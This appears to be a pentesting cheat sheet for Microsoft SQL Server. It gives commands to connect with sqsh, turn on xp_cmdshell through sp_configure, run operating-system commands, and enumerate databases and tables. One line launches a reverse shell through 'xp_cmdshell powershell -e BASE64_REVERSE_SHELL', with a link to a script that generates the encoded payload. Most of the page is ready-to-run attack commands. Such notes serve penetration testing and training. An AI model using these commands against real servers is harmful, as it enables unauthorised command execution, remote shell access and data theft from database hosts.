# MSSQL 
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

### Connect
https://github.com/sandkoan/SQshell

```
sqsh -S IP_ADDRESS -U USERNAME -P PASSWORD
```

### XP_CMDSHELL
https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16
Spawns a Windows command shell and passes in a string for execution. Any output is returned as rows of text.

##### Enable 
```
-- this turns on advanced options and is needed to configure xp_cmdshell
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE

-- this enables xp_cmdshell
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

##### Reverse Shell
Shell code could be generated using https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58 

```
xp_cmdshell whoami
xp_cmdshell powershell -e BASE64_REVERSE_SHELL
```

### Enumeration
Enumerating Databases

```
SELECT name FROM master.dbo.sysdatabases
```

```
USE "DATABASE_NAME"
```

Enumerating Tables

```
SELECT * FROM INFORMATION_SCHEMA.TABLES
```

```
SELECT * FROM "TABLE_NAME"
```